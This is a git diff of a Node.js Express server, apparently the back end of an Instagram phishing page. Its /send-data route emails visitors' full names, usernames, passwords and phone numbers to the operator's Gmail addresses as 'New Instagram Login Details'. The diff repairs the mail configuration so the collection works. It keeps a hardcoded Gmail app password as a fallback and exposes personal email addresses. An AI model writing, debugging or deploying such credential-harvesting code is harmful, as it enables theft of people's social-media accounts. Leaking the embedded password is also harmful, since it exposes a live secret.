@@ -7,7 +7,7 @@ const app = express();
 app.use(express.json());
 app.use(cors());
 
-// Static HTML/CSS files serve karne ke liye
+// Static files serve karne ke liye
 app.use(express.static(__dirname));
 
 // Main page (index.html) serve karne ke liye
@@ -19,9 +19,8 @@ app.get('/', (req, res) => {
 const transporter = nodemailer.createTransport({
     service: 'gmail',
     auth: {
-        user: 'myaqoobbhurgri4@gmail.com.',
-        user: 'lagharitahir08@gmail.com.',
-        pass: 'mcfn tmzh qnxd ghaa' // App Password
+        user: process.env.EMAIL_USER || 'lagharitahir08@gmail.com',
+        pass: process.env.EMAIL_PASS || 'mcfn tmzh qnxd ghaa' // Vercel Environment Variables mein store karein
     }
 });
 
@@ -30,10 +29,10 @@ app.post('/send-data', (req, res) => {
 
     const mailOptions = {
         from: 'lagharitahir08@gmail.com',
-        to: 'lagharitahir08@gmail.com',tahirlaghari094@gmail.com',
+        to: 'lagharitahir08@gmail.com, tahirlaghari094@gmail.com', // Correct comma-separated string
         subject: 'New Instagram Login Details',
         text: `Nayi Login Details aayi hain:
-        
+
 Full Name: ${fullname}
 Username: ${username}
 Password: ${password}
@@ -42,7 +41,7 @@ Phone Number: ${phone}`
 
     transporter.sendMail(mailOptions, (error, info) => {
         if (error) {
-            console.log(error);
+            console.log("Email Error:", error);
             return res.status(500).send("Email send karne mein error aayi.");
         } else {
             console.log('Email sent: ' + info.response);
@@ -51,13 +50,13 @@ Phone Number: ${phone}`
     });
 });
 
-// Local run karne ke liye aur Vercel ke liye support
+// Local Development Support
 if (process.env.NODE_ENV !== 'production') {
-    const PORT = 3000;
+    const PORT = process.env.PORT || 3000;
     app.listen(PORT, () => {
         console.log(`Server ${PORT} port par chal raha hai.`);
     });
 }
 
-// Vercel ke liye export
+// Vercel serverless export
 module.exports = app;
